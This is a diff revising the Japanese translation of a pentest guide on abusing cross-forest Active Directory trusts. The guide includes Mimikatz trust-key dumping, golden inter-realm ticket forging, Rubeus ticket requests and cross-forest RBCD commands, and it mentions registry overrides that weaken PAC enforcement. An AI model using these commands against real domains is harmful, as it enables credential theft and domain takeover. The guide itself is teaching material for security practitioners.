@@ -1,12 +1,12 @@
-# External Forest Domain - OneWay（Inbound）または bidirectional
+# 外部フォレストドメイン - OneWay (Inbound) または双方向
 
 {{#include ../../banners/hacktricks-training.md}}
 
-このシナリオでは、external domain があなたを trust している（または相互に trust している）ため、そのドメインに対して何らかの access を取得できます。
+このシナリオでは、外部ドメインがあなたを信頼している（または相互に信頼している）ため、そのドメインに対して何らかのアクセス権を取得できます。
 
-## Enumeration
+## 列挙
 
-まず、**trust** を **enumerate** する必要があります：
+まず、**trust** を**列挙**する必要があります。
 ```bash
 Get-DomainTrust
 SourceName      : a.domain.local   --> Current domain
@@ -59,15 +59,15 @@ IsDomain     : True
 # Additional trust hygiene checks (AD RSAT / AD module)
 Get-ADTrust -Identity domain.external -Properties SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation,ForestTransitive
 ```
-> `SelectiveAuthentication`/`SIDFiltering*` を使うと、追加の前提条件なしで、cross-forest abuse paths（RBCD、SIDHistory）が機能する可能性をすばやく確認できます。<sup>[[2]](#references)</sup>
+> `SelectiveAuthentication`/`SIDFiltering*` により、追加の前提条件なしで、cross-forest abuse path（RBCD、SIDHistory）が機能する可能性をすぐに確認できます。<sup>[[2]](#references)</sup>
 
-前回の enumeration で、ユーザー **`crossuser`** が、**外部ドメインの DC** 内で **Admin access** を持つ **`External Admins`** グループに所属していることが判明しました。
+前回の enumeration で、ユーザー **`crossuser`** が、**External Domain の DC** 内で **Admin access** を持つ **`External Admins`** グループに所属していることが判明しました。
 
-## Initial Access
+## 初期アクセス
 
-他のドメインでユーザーに **special** なアクセス権を見つけられなかった場合でも、AD Methodology に戻り、**unprivileged user** から **privesc** を試すことができます（例えば kerberoasting など）。
+他のドメインで自分のユーザーに **special** access が見つからなかった場合でも、AD Methodology に戻り、**unprivileged user から privesc** を試すことができます（例えば kerberoasting など）。
 
-`-Domain` param を使用して、以下のように **Powerview functions** で **他のドメイン** を **enumerate** できます：
+`-Domain` param を使用して、次のように **Powerview functions** で **other domain** を **enumerate** できます：
 ```bash
 Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 ```
@@ -79,31 +79,31 @@ Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 
 ### ログイン
 
-外部ドメインへのアクセス権を持つユーザーの認証情報を通常の方法で使用すれば、アクセスできるはずです。
+外部ドメインへのアクセス権を持つユーザーの認証情報を使用して通常の方法でログインすれば、次のことが可能なはずです：
 ```bash
 Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
 ```
 ### SID History Abuse
 
-forest trust を介して [**SID History**](sid-history-injection.md) を abuse することもできます。
+forest trust across でも [**SID History**](sid-history-injection.md) を abuse できます。
 
-ユーザーが **ある forest から別の forest へ** migration され、**SID Filtering が有効化されていない**場合、**他方の forest の SID** を **追加**できるようになり、この **SID** は **trust を介して authentication** する際に **ユーザーの token** に **追加**されます。
+ユーザーが **ある forest から別の forest へ** migration され、**SID Filtering が有効化されていない**場合、**もう一方の forest の SID** を **追加**できるようになり、この **SID** は **trust をまたいで authentication** する際に **ユーザーの token** に **追加**されます。
 
 > [!WARNING]
-> 念のため、以下のコマンドで signing key を取得できます。
+> 念のため、signing key は次のコマンドで取得できます。
 >
 > ```bash
 > Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
 > ```
 
-**trusted** key で **sign** し、現在の domain のユーザーを **impersonating** する **TGT** を作成できます。
+**trusted** key で **sign** し、現在の domain のユーザーになりすました **TGT** を作成できます。
 ```bash
 # Get a TGT for the cross-domain privileged user to the other domain
 Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'
 
 # Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
 ## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
-Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:C:\path\save\ticket.kirbi /nowrap
+Rubeus.exe asktgs /service:cifs/dc.domain.external /domain:dc.domain.external /dc:dc.domain.external /ticket:C:\path\save\ticket.kirbi /nowrap
 
 # Now you have a TGS to access the CIFS service of the domain controller
 ```
@@ -117,13 +117,13 @@ Rubeus.exe asktgs /service:krbtgt/domain.external /domain:sub.domain.local /dc:d
 
 # Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
 ## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
-Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap
+Rubeus.exe asktgs /service:cifs/dc.domain.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap
 
 # Now you have a TGS to access the CIFS service of the domain controller
 ```
-### 信頼フォレスト内のコンピューターアカウントを制御している場合の Cross-forest RBCD（SID filtering / selective auth なし）
+### Cross-forest RBCD: trusting forest の machine account を制御している場合（SID filtering / selective auth なし）
 
-foreign principal（FSP）によって、信頼フォレスト内のコンピューターオブジェクトに書き込み可能なグループ（例: `Account Operators`、カスタムのプロビジョニンググループ）に所属できる場合、そのフォレストの対象ホストに **Resource-Based Constrained Delegation** を設定し、そこで任意のユーザーになりすますことができます:
+foreign principal（FSP）によって、trusting forest 内の computer object に書き込み可能な group（例: `Account Operators`、custom provisioning group）に所属できる場合、その forest の target host に **Resource-Based Constrained Delegation** を設定し、そこで任意の user を impersonate できます:
 ```bash
 # 1) From the trusted domain, create or compromise a machine account (MYLAB$) you control
 # 2) In the trusting forest (domain.external), set msDS-AllowedToAct on the target host for that account
@@ -134,15 +134,14 @@ Set-DomainObject victim-host$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=
 # 3) Use the inter-forest TGT to perform S4U to victim-host$ and get a CIFS ticket as DA of the trusting forest
 Rubeus.exe s4u /ticket:interrealm_tgt.kirbi /impersonate:EXTERNAL\Administrator /target:victim-host.domain.external /protocol:rpc
 ```
-これは、**SelectiveAuthentication が無効**で、かつ **SID filtering** によって制御対象の SID が除去されない場合にのみ機能します。SIDHistory forging を回避できる高速な lateral path であり、trust のレビューで見落とされることがよくあります。<sup>[[2]](#references)</sup>
+これは **SelectiveAuthentication が無効**で、かつ **SID filtering** によって制御対象の SID が削除されない場合にのみ機能します。SIDHistory forging を回避できる高速な lateral path であり、trust review で見落とされることがよくあります。<sup>[[2]](#references)</sup>
 
 ### PAC validation の hardening
 
-**CVE-2024-26248**/**CVE-2024-29056** に対する PAC signature validation の更新により、inter-forest ticket で signing enforcement が追加されます。**Compatibility mode** では、未適用の DC に対して forged inter-realm PAC/SIDHistory/S4U path が依然として機能する可能性があります。**Enforcement mode** では、forest trust をまたぐ unsigned または改ざんされた PAC data は、対象 forest の trust key も保持していない限り拒否されます。Registry overrides（`PacSignatureValidationLevel`、`CrossDomainFilteringLevel`）が引き続き利用可能な間は、これによってこの enforcement を弱めることができます。<sup>[[1]](#references)</sup>
+**CVE-2024-26248**/**CVE-2024-29056** に対する PAC signature validation の更新により、inter-forest ticket に対する signing enforcement が追加されます。**Compatibility mode** では、forged inter-realm PAC/SIDHistory/S4U path が、未 patch の DC 上で引き続き機能する可能性があります。**Enforcement mode** では、forest trust を越える unsigned または改ざんされた PAC data は、対象 forest の trust key も保持していない限り拒否されます。Registry override（`PacSignatureValidationLevel`、`CrossDomainFilteringLevel`）が利用可能な間は、これによって保護を弱めることができます。<sup>[[1]](#references)</sup>
 
 ## References
 
-- [1] [Microsoft KB5037754 – CVE-2024-26248 および CVE-2024-29056 に関連する PAC validation の変更](https://support.microsoft.com/en-au/topic/how-to-manage-pac-validation-changes-related-to-cve-2024-26248-and-cve-2024-29056-6e661d4f-799a-4217-b948-be0a1943fef1)
-- [2] [MS-PAC spec – SID filtering と claims transformation の詳細](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280)
-
+- [1] [Microsoft KB5037754 – CVE-2024-26248 および CVE-2024-29056 に関する PAC validation の変更](https://support.microsoft.com/en-au/topic/how-to-manage-pac-validation-changes-related-to-cve-2024-26248-and-cve-2024-29056-6e661d4f-799a-4217-b948-be0a1943fef1)
+- [2] [MS-PAC spec – SID filtering および claims transformation の詳細](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280)
 {{#include ../../banners/hacktricks-training.md}}
